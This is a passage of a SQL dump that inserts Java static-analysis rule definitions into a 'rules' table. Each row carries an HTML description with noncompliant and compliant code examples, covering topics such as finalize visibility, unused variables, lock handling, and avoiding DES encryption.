</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cwe,owasp-a5,owasp-a6,sans-top25-porous', false, 'HTML', 1510817813036, 1510817813037, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1001, '"Object.finalize()" should remain protected (versus public) when overriding', 'S1174', NULL, 'squid', '<p>The contract of the <code>Object.finalize()</code> method is clear: only the Garbage Collector is supposed to call this method.</p>
<p>Making this method public is misleading, because it implies that any caller can use it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  @Override
  public void finalize() {    // Noncompliant
    /* ... */
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/583.html">MITRE, CWE-583</a> - finalize() Method Declared Public </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/H4cbAQ">CERT, MET12-J.</a> - Do not use finalizers </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cert,cwe', false, 'HTML', 1510817813056, 1510817813057, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (985, '"final" classes should not have "protected" members', 'S2156', NULL, 'squid', '<p>The difference between <code>private</code> and <code>protected</code> visibility is that child classes can see and use <code>protected</code>
members, but they cannot see <code>private</code> ones. Since a <code>final</code> class will have no children, marking the members of a
<code>final</code> class <code>protected</code> is confusingly pointless.</p>
<p>Note that the <code>protected</code> members of a class can also be seen and used by other classes that are placed within the same package, this
could lead to accidental, unintended access to otherwise private members.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public final class MyFinalClass {

  protected String name = "Fred";  // Noncompliant
  protected void setName(String name) {  // Noncompliant
    // ...
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
public final class MyFinalClass {

  private String name = "Fred";
  public void setName(String name) {
    // ...
  }
</pre>
<h2>Exceptions</h2>
<p>Members annotated with Guava''s <code>@VisibleForTesting</code> annotation are ignored, as it indicates that visibility has been purposely relaxed
to make the code testable.</p>
<pre>
public final class MyFinalClass {
  @VisibleForTesting
  protected Logger logger; // Compliant

  @VisibleForTesting
  protected int calculateSomethingComplex(String input) { // Compliant
    // ...
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'confusing', false, 'HTML', 1510817813037, 1510817813038, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (986, 'Expressions should not be too complex', 'S1067', NULL, 'squid', '<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>
operators it contains.</p>
<p>A single expression''s complexity should not become too high to keep the code readable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value of 3:</p>
<pre>
if (((condition1 &amp;&amp; condition2) || (condition3 &amp;&amp; condition4)) &amp;&amp; condition5) { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if ( (myFirstCondition() || mySecondCondition()) &amp;&amp; myLastCondition()) { ... }
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR_OFFSET', NULL, '1min', NULL, '5min', 'per complexity point above the threshold', NULL, 'brain-overload', false, 'HTML', 1510817813039, 1510817813039, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (987, 'Lambdas and anonymous classes should not have too many lines of code', 'S1188', NULL, 'squid', '<p>Anonymous classes and lambdas (with Java 8) are a very convenient and compact way to inject a behavior without having to create a dedicated class.
But those anonymous inner classes and lambdas should be used only if the behavior to be injected can be defined in a few lines of code, otherwise the
source code can quickly become unreadable.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'java8', false, 'HTML', 1510817813040, 1510817813041, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (988, '"wait(...)" should be used instead of "Thread.sleep(...)" when a lock is held', 'S2276', NULL, 'squid', '<p>If <code>Thread.sleep(...)</code> is called when the current thread holds a lock, it could lead to performance and scalability issues, or even
worse to deadlocks because the execution of the thread holding the lock is frozen. It''s better to call <code>wait(...)</code> on the monitor object to
temporarily release the lock and allow other threads to run.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(){
  synchronized(monitor) {
    while(notReady()){
      Thread.sleep(200);
    }
    process();
  }
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(){
  synchronized(monitor) {
    while(notReady()){
      monitor.wait(200);
    }
    process();
  }
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/FgG7AQ">CERT, LCK09-J.</a> - Do not perform operations that can block while holding a
  lock </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,multi-threading,performance', false, 'HTML', 1510817813042, 1510817813042, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (989, 'Unused "private" fields should be removed', 'S1068', NULL, 'squid', '<p>If a <code>private</code> field is declared but not used in the program, it can be considered dead code and should therefore be removed. This will
improve maintainability because developers will not wonder what the variable is used for.</p>
<p>Note that this rule does not take reflection into account, which means that issues will be raised on <code>private</code> fields that are only
accessed using the reflection API.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  private int foo = 42;

  public int compute(int a) {
    return a * 42;
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  public int compute(int a) {
    return a * 42;
  }
}
</pre>
<h2>Exceptions</h2>
<p>The Java serialization runtime associates with each serializable class a version number, called <code>serialVersionUID</code>, which is used during
deserialization to verify that the sender and receiver of a serialized object have loaded classes for that object that are compatible with respect to
serialization.</p>
<p>A serializable class can declare its own <code>serialVersionUID</code> explicitly by declaring a field named <code>serialVersionUID</code> that
must be static, final, and of type long. By definition those <code>serialVersionUID</code> fields should not be reported by this rule:</p>
<pre>
public class MyClass implements java.io.Serializable {
  private static final long serialVersionUID = 42L;
}
</pre>
<p>Moreover, this rule doesn''t raise any issue on annotated fields.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP.</a> - Detect and remove code that has no effect </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,unused', false, 'HTML', 1510817813043, 1510817813043, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (990, 'Neither DES (Data Encryption Standard) nor DESede (3DES) should be used', 'S2278', NULL, 'squid', '<p>According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer considered secure:</p>
<blockquote>
  <p>Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn because it no longer
  provides the security that is needed to protect federal government information.</p>
  <p>Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS 197 in 2001.</p>
</blockquote>
<p>For similar reasons, RC2 should also be avoided.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Cipher c = Cipher.getInstance("DESede/ECB/PKCS5Padding");
</pre>
<h2>Compliant Solution</h2>
<pre>
Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/326.html">MITRE CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/VwAZAg">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
  <li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE">DES / DESede Unsafe</a> </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cert,cwe,owasp-a6,sans-top25-porous', false, 'HTML', 1510817813044, 1510817813044, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1014, 'Unused local variables should be removed', 'S1481', NULL, 'squid', '<p>If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will
not wonder what the variable is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int numberOfMinutes(int hours) {
  int seconds = 0;   // seconds is never used
  return hours * 60;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int numberOfMinutes(int hours) {
  return hours * 60;
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'unused', false, 'HTML', 1510817813071, 1510817813071, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (991, '"Cloneables" should implement "clone"', 'S2157', NULL, 'squid', '<p>Simply implementing <code>Cloneable</code> without also overriding <code>Object.clone()</code> does not necessarily make the class cloneable. While
the <code>Cloneable</code> interface does not include a <code>clone</code> method, it is required by convention, and ensures true cloneability.
Otherwise the default JVM <code>clone</code> will be used, which copies primitive values and object references from the source to the target. I.e.
without overriding <code>clone</code>, any cloned instances will potentially share members with the source instance.</p>
<p>Removing the <code>Cloneable</code> implementation and providing a good copy constructor is another viable (some say preferable) way of allowing a
class to be copied.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Team implements Cloneable {  // Noncompliant
  private Person coach;
  private List&lt;Person&gt; players;
  public void addPlayer(Person p) {...}
  public Person getCoach() {...}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Team implements Cloneable {
  private Person coach;
  private List&lt;Person&gt; players;
  public void addPlayer(Person p) { ... }
  public Person getCoach() { ... }

  @Override
  public Object clone() {
    Team clone = (Team) super.clone();
    //...
  }
}
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'api-design,convention', false, 'HTML', 1510817813045, 1510817813045, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (992, 'Member variable visibility should be specified', 'S2039', NULL, 'squid', '<p>Failing to explicitly declare the visibility of a member variable could result it in having a visibility you don''t expect, and potentially leave it
open to unexpected modification by other classes. </p>
<h2>Noncompliant Code Example</h2>
<pre>
class Ball {
    String color="red";  // Noncompliant
}
enum A {
  B;
  int a;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Ball {
    private String color="red";  // Compliant
}
enum A {
  B;
  private int a;
}
</pre>
<h2>Exceptions</h2>
<p>Members annotated with Guava''s <code>@VisibleForTesting</code> annotation are ignored, as it indicates that visibility has been purposely relaxed
to make the code testable.</p>
<pre>
class Cone {
  @VisibleForTesting
  Logger logger; // Compliant
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817813046, 1510817813046, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (993, 'Silly equality checks should not be made', 'S2159', NULL, 'squid', '<p>Comparisons of dissimilar types will always return false. The comparison and all its dependent code can simply be removed. This includes:</p>
<ul>
  <li> comparing an object with null </li>
  <li> comparing an object with an unrelated primitive (E.G. a string with an int) </li>
  <li> comparing unrelated classes </li>
  <li> comparing an unrelated <code>class</code> and <code>interface</code> </li>
  <li> comparing unrelated <code>interface</code> types </li>
  <li> comparing an array to a non-array </li>
  <li> comparing two arrays </li>
</ul>
<p>Specifically in the case of arrays, since arrays don''t override <code>Object.equals()</code>, calling <code>equals</code> on two arrays is the same
as comparing their addresses. This means that <code>array1.equals(array2)</code> is equivalent to <code>array1==array2</code>.</p>
<p>However, some developers might expect <code>Array.equals(Object obj)</code> to do more than a simple memory address comparison, comparing for
instance the size and content of the two arrays. Instead, the <code>==</code> operator or <code>Arrays.equals(array1, array2)</code> should always be
used with arrays.</p>
<h2>Noncompliant Code Example</h2>
<pre>
interface KitchenTool { ... };
interface Plant {...}

public class Spatula implements KitchenTool { ... }
public class Tree implements Plant { ...}
//...

Spatula spatula = new Spatula();
KitchenTool tool = spatula;
KitchenTool [] tools = {tool};

Tree tree = new Tree();
Plant plant = tree;
Tree [] trees = {tree};


if (spatula.equals(tree)) { // Noncompliant; unrelated classes
  // ...
}
else if (spatula.equals(plant)) { // Noncompliant; unrelated class and interface
  // ...
}
else if (tool.equals(plant)) { // Noncompliant; unrelated interfaces
  // ...
}
else if (tool.equals(tools)) { // Noncompliant; array &amp; non-array
  // ...
}
else if (trees.equals(tools)) {  // Noncompliant; incompatible arrays
  // ...
}
else if (tree.equals(null)) {  // Noncompliant
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/IQAlAg">CERT, EXP02-J.</a> - Do not use the Object.equals() method to compare two
  arrays </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert,unused', false, 'HTML', 1510817813047, 1510817813047, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (995, 'Public constants and fields initialized at declaration should be "static final" rather than merely "final"', 'S1170', NULL, 'squid', '<p>Making a <code>public</code> constant just <code>final</code> as opposed to <code>static final</code> leads to duplicating its value for every
instance of the class, uselessly increasing the amount of memory required to execute the application.</p>
<p>Further, when a non-<code>public</code>, <code>final</code> field isn''t also <code>static</code>, it implies that different instances can have
different values. However, initializing a non-<code>static final</code> field in its declaration forces every instance to have the same value. So such
fields should either be made <code>static</code> or initialized in the constructor.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Myclass {
  public final int THRESHOLD = 3;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Myclass {
  public static final int THRESHOLD = 3;    // Compliant
}
</pre>
<h2>Exceptions</h2>
<p>No issues are reported on final fields of inner classes whose type is not a primitive or a String. Indeed according to the Java specification:</p>
<blockquote>
  <p>An inner class is a nested class that is not explicitly or implicitly declared static. Inner classes may not declare static initializers (§8.7)
  or member interfaces. Inner classes may not declare static members, unless they are compile-time constant fields (§15.28).</p>
</blockquote>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'convention', false, 'HTML', 1510817813049, 1510817813049, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (996, 'Only static class initializers should be used', 'S1171', NULL, 'squid', '<p>Non-static initializers are rarely used, and can be confusing for most developers because they only run when new class instances are created. When
possible, non-static initializers should be refactored into standard constructors or field initializers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {
  private static final Map&lt;String, String&gt; MY_MAP = new HashMap&lt;String, String&gt;() {

    // Noncompliant - HashMap should be extended only to add behavior, not for initialization
    {
      put("a", "b");
    }

  };
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
  private static final Map&lt;String, String&gt; MY_MAP = new HashMap&lt;String, String&gt;();

  static {
    MY_MAP.put("a", "b");
  }
}
</pre>
<p>or using Guava:</p>
<pre>
class MyClass {
  // Compliant
  private static final Map&lt;String, String&gt; MY_MAP = ImmutableMap.of("a", "b");
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813050, 1510817813051, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (997, 'Unused method parameters should be removed', 'S1172', NULL, 'squid', '<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething(int a, int b) {     // "b" is unused
  compute(a);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething(int a) {
  compute(a);
}
</pre>
<h2>Exceptions</h2>
<p>The rule will not raise issues for unused parameters:</p>
<ul>
  <li> that are annotated with <code>@javax.enterprise.event.Observes</code> </li>
  <li> in overrides and implementation methods </li>
  <li> in interface <code>default</code> methods </li>
  <li> in non-private methods that only <code>throw</code> or that have empty bodies </li>
  <li> in annotated methods, unless the annotation is <code>@SuppressWarning("unchecked")</code> or <code>@SuppressWarning("rawtypes")</code>, in
  which case the annotation will be ignored </li>
  <li> in overridable methods (non-final, or not member of a final class, non-static, non-private), if the parameter is documented with a proper
  javadoc. </li>
</ul>
<pre>
@Override
void doSomething(int a, int b) {     // no issue reported on b
  compute(a);
}

public void foo(String s) {
  // designed to be extended but noop in standard case
}

protected void bar(String s) {
  //open-closed principle
}

public void qix(String s) {
  throw new UnsupportedOperationException("This method should be implemented in subclasses");
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 0-1-11 - There shall be no unused parameters (named or unnamed) in nonvirtual functions. </li>
  <li> MISRA C:2012, 2.7 - There should be no unused parameters in functions </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP.</a> - Detect and remove code that has no effect </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,misra,unused', false, 'HTML', 1510817813051, 1510817813052, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (998, 'Classes that don''t define "hashCode()" should not be used in hashes', 'S2141', NULL, 'squid', '<p>Because <code>Object</code> implements <code>hashCode</code>, any Java class can be put into a hash structure. However, classes that define
<code>equals(Object)</code> but not <code>hashCode()</code> aren''t truly hash-able because instances that are equivalent according to the
<code>equals</code> method can return different hashes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Student {  // no hashCode() method; not hash-able
  // ...

  public boolean equals(Object o) {
    // ...
  }
}

public class School {
  private Map&lt;Student, Integer&gt; studentBody = // okay so far
          new HashTable&lt;Student, Integer&gt;(); // Noncompliant

  // ...
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Student {  // has hashCode() method; hash-able
  // ...

  public boolean equals(Object o) {
    // ...
  }
  public int hashCode() {
    // ...
  }
}

public class School {
  private Map&lt;Student, Integer&gt; studentBody = new HashTable&lt;Student, Integer&gt;();

  // ...
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817813053, 1510817813053, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (999, 'Methods of "Random" that return floating point values should not be used in random integer generation', 'S2140', NULL, 'squid', '<p>There is no need to multiply the output of <code>Random</code>''s <code>nextDouble</code> method to get a random integer. Use the
<code>nextInt</code> method instead.</p>
<p>This rule raises an issue when the return value of any of <code>Random</code>''s methods that return a floating point value is converted to an
integer.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Random r = new Random();
int rand = (int)r.nextDouble() * 50;  // Noncompliant way to get a pseudo-random value between 0 and 50
int rand2 = (int)r.nextFloat(); // Noncompliant; will always be 0;
</pre>
<h2>Compliant Solution</h2>
<pre>
Random r = new Random();
int rand = r.nextInt(50);  // returns pseudo-random value between 0 and 50
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817813054, 1510817813054, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1000, 'Classes should not be too complex', 'ClassCyclomaticComplexity', 'S1311', 'squid', '<p>The Cyclomatic Complexity is measured by the number of <code>&amp;&amp;</code> and <code>||</code> operators and <code>if</code>,
<code>while</code>, <code>do</code>, <code>for</code>, <code>?:</code>, <code>catch</code>, <code>switch</code>, <code>case</code>,
<code>return</code> and <code>throw</code> statements in the body of a class plus one for each constructor, method, static initializer, or instance
initializer in the class. The last return statement in method, if exists, is not taken into account.</p>
<p>Even when the Cyclomatic Complexity of a class is very high, this complexity might be well distributed among all methods. Nevertheless, most of the
time, a very complex class is a class which breaks the Single Responsibility Principle and which should be re-factored to be split in several
classes.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR_OFFSET', NULL, '1min', NULL, '10min', 'per complexity point over the threshold', NULL, NULL, false, 'HTML', 1510817813055, 1510817813055, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1018, 'Types should be used in lambdas', 'S2211', NULL, 'squid', '<p>Shared coding conventions allow teams to collaborate effectively. While types for lambda arguments are optional, specifying them anyway makes the
code clearer and easier to read.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Arrays.sort(rosterAsArray,
    (a, b) -&gt; {  // Noncompliant
        return a.getBirthday().compareTo(b.getBirthday());
    }
);
</pre>
<h2>Compliant Solution</h2>
<pre>
Arrays.sort(rosterAsArray,
    (Person a, Person b) -&gt; {
        return a.getBirthday().compareTo(b.getBirthday());
    }
);
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention,java8', false, 'HTML', 1510817813075, 1510817813075, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1002, '"java.time" classes should be used for dates and times', 'S2143', NULL, 'squid', '<p>The old, much-derided <code>Date</code> and <code>Calendar</code> classes have always been confusing and difficult to use properly, particularly in
a multi-threaded context. <code>JodaTime</code> has long been a popular alternative, but now an even better option is built-in. Java 8''s JSR 310
implementation offers specific classes for:</p>
<table>
  <tbody>
    <tr>
      <th>Class</th>
      <th>Use for</th>
    </tr>
    <tr>
      <td>LocalDate</td>
      <td>a date, without time of day, offset, or zone</td>
    </tr>
    <tr>
      <td>LocalTime</td>
      <td>the time of day, without date, offset, or zone</td>
    </tr>
    <tr>
      <td>LocalDateTime</td>
      <td>the date and time, without offset, or zone</td>
    </tr>
    <tr>
      <td>OffsetDate</td>
      <td>a date with an offset such as +02:00, without time of day, or zone</td>
    </tr>
    <tr>
      <td>OffsetTime</td>
      <td>the time of day with an offset such as +02:00, without date, or zone</td>
    </tr>
    <tr>
      <td>OffsetDateTime</td>
      <td>the date and time with an offset such as +02:00, without a zone</td>
    </tr>
    <tr>
      <td>ZonedDateTime</td>
      <td>the date and time with a time zone and offset</td>
    </tr>
    <tr>
      <td>YearMonth</td>
      <td>a year and month</td>
    </tr>
    <tr>
      <td>MonthDay</td>
      <td>month and day</td>
    </tr>
    <tr>
      <td>Year/MonthOfDay/DayOfWeek/...</td>
      <td>classes for the important fields</td>
    </tr>
    <tr>
      <td>DateTimeFields</td>
      <td>stores a map of field-value pairs which may be invalid</td>
    </tr>
    <tr>
      <td>Calendrical</td>
      <td>access to the low-level API</td>
    </tr>
    <tr>
      <td>Period</td>
      <td>a descriptive amount of time, such as "2 months and 3 days"</td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
Date now = new Date();  // Noncompliant
DateFormat df = new SimpleDateFormat("dd.MM.yyyy");
Calendar christmas  = Calendar.getInstance();  // Noncompliant
christmas.setTime(df.parse("25.12.2020"));
</pre>
<h2>Compliant Solution</h2>
<pre>
LocalDate now = LocalDate.now();  // gets calendar date. no time component
LocalTime now2 = LocalTime.now(); // gets current time. no date component
LocalDate christmas = LocalDate.of(2020,12,25);
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'java8,pitfall', false, 'HTML', 1510817813058, 1510817813058, 1);
